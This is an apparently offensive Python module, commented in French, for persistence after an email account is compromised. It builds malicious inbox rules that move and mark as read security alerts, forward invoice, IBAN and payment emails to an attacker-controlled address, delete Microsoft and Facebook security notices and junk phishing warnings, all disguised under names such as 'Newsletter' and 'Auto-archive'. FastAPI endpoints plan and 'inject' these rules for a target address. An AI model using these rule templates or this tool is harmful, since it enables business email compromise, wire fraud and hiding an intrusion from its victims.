"""
Mailbox Pivot - Inbox Rule Injection (Persistence via Email)
=============================================================

Une fois un compte compromis (via OAuth consent grant), l'attaquant peut
injecter des règles de boîte de réception (Inbox Rules) pour :
  1. Cacher les emails de sécurité (notifications MFA, alertes Microsoft)
     en les déplaçant vers un dossier RSS Feeds / archive / courrier indésirable
  2. Forwarder tous les emails financiers (sujet contient "wire transfer",
     "facture", "paiement") vers une adresse externe contrôlée par l'attaquant
  3. Supprimer automatiquement les messages contenant certains mots-clés
     ("phishing", "security alert", "compromised")
  4. Marquer comme lu les messages de MFA bombing pour réduire la visibilité

Microsoft, Google et Yahoo supportent tous ce type de règles via API.
Cette technique est référencée MITRE ATT&CK T1114.003 (Email Collection:
Email Forwarding Rule) et est au cœur des compromissions BEC (Business
Email Compromise) de 2024-2026.

Cas réel : compte CFO compromis -> forward des emails contenant
"invoice" et "bank details" -> fraude au virement de plusieurs millions.
"""

import json
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class RuleAction(Enum):
    """Actions possibles sur les règles."""

    MOVE_TO_FOLDER = "MoveToFolder"
    FORWARD_TO = "ForwardTo"
    DELETE = "Delete"
    MARK_AS_READ = "MarkAsRead"
    MOVE_TO_JUNK = "MoveToJunk"
    COPY_TO_FOLDER = "CopyToFolder"


@dataclass
class InboxRule:
    """Une règle de boîte de réception malveillante."""

    rule_id: str
    display_name: str
    conditions: dict[str, Any]
    actions: list[dict[str, Any]]
    is_enabled: bool = True
    priority: int = 1
    created_at: float = field(default_factory=time.time)


class MailboxPivot:
    """
    Gestionnaire de règles de boîte de réception offensives.

    Stratégie typique :
      1. Via un refresh token OAuth volé, on appelle Graph API
      2. On crée des règles de type "MoveToFolder" sur les emails de sécurité
      3. On crée une règle "ForwardTo" sur les emails financiers
      4. On attend que l'attaquant reçoive les emails forwardés
    """

    MALICIOUS_RULE_TEMPLATES = {
        "hide_microsoft_security": {
            "display_name": "Newsletter",
            "conditions": {
                "subjectContains": [
                    "security alert", "unusual sign-in",
                    "new sign-in", "your password",
                    "verification code", "Microsoft account",
                ],
            },
            "actions": [
                {"type": RuleAction.MOVE_TO_FOLDER.value, "folder": "RSS Feeds"},
                {"type": RuleAction.MARK_AS_READ.value},
            ],
        },
        "forward_financial": {
            "display_name": "Auto-archive",
            "conditions": {
                "subjectContains": [
                    "invoice", "paiement", "wire", "virement",
                    "facture", "payment", "RIB", "IBAN",
                    "bank", "banque",
                ],
            },
            "actions": [
                {"type": RuleAction.FORWARD_TO.value,
                 "recipients": ["finance.audit@protonmail.example.invalid"]},
                {"type": RuleAction.MOVE_TO_FOLDER.value, "folder": "Archive"},
            ],
        },
        "delete_security_notifications": {
            "display_name": "Cleanup",
            "conditions": {
                "fromContains": [
                    "account-security-noreply@accountprotection.microsoft.com",
                    "no-reply@microsoft.com",
                    "security@facebookmail.com",
                ],
            },
            "actions": [{"type": RuleAction.DELETE.value}],
        },
        "suppress_phishing_alerts": {
            "display_name": "Junk filter",
            "conditions": {
                "bodyContains": ["phishing", "compromised", "suspicious activity"],
            },
            "actions": [
                {"type": RuleAction.MOVE_TO_JUNK.value},
                {"type": RuleAction.MARK_AS_READ.value},
            ],
        },
    }

    def __init__(self, output_dir: str = "captures/mailbox_pivot") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.targets: dict[str, list[InboxRule]] = {}

    def plan_rules(
        self, target_email: str, templates: list[str] | None = None
    ) -> list[InboxRule]:
        """
        Génère un plan de règles à injecter pour une cible donnée.
        En production : on appellerait Graph API / Gmail API.
        """
        if templates is None:
            templates = list(self.MALICIOUS_RULE_TEMPLATES.keys())
        rules: list[InboxRule] = []
        for tpl_name in templates:
            tpl = self.MALICIOUS_RULE_TEMPLATES.get(tpl_name)
            if not tpl:
                continue
            rule = InboxRule(
                rule_id=str(uuid.uuid4()),
                display_name=tpl["display_name"],
                conditions=tpl["conditions"],
                actions=tpl["actions"],
            )
            rules.append(rule)
        self.targets[target_email] = rules
        return rules

    def inject(self, target_email: str, rules: list[InboxRule]) -> dict[str, Any]:
        """
        Simule l'injection des règles dans la mailbox cible.
        En production : httpx.post(graph_url, headers=..., json=rule)
        """
        path = self.output_dir / f"{target_email}.json"
        payload = {
            "target": target_email,
            "injected_rules": [
                {
                    "rule_id": r.rule_id,
                    "display_name": r.display_name,
                    "conditions": r.conditions,
                    "actions": r.actions,
                }
                for r in rules
            ],
            "ts": time.time(),
        }
        path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
        return {"target": target_email, "injected": len(rules), "path": str(path)}

    def impact_summary(self, target_email: str) -> dict[str, Any]:
        """Résumé de l'impact attendu des règles injectées."""
        rules = self.targets.get(target_email, [])
        return {
            "target": target_email,
            "n_rules": len(rules),
            "hides_mfa_alerts": any("security" in r.display_name.lower() for r in rules),
            "forwards_financial": any(
                any(a.get("type") == RuleAction.FORWARD_TO.value for a in r.actions)
                for r in rules
            ),
            "deletes_security_emails": any(
                any(a.get("type") == RuleAction.DELETE.value for a in r.actions)
                for r in rules
            ),
        }


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_pivot_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    pivot = MailboxPivot()

    class PlanRequest(BaseModel):
        target_email: str
        templates: list[str] | None = None

    @app.post("/_/mailbox/plan")
    async def plan(req: PlanRequest):
        rules = pivot.plan_rules(req.target_email, req.templates)
        return {
            "target": req.target_email,
            "rules": [
                {
                    "rule_id": r.rule_id,
                    "display_name": r.display_name,
                    "conditions": r.conditions,
                    "actions": r.actions,
                }
                for r in rules
            ],
        }

    @app.post("/_/mailbox/inject")
    async def inject(req: PlanRequest):
        rules = pivot.plan_rules(req.target_email, req.templates)
        result = pivot.inject(req.target_email, rules)
        return result

    @app.get("/_/mailbox/impact/{target_email}")
    async def impact(target_email: str):
        return pivot.impact_summary(target_email)
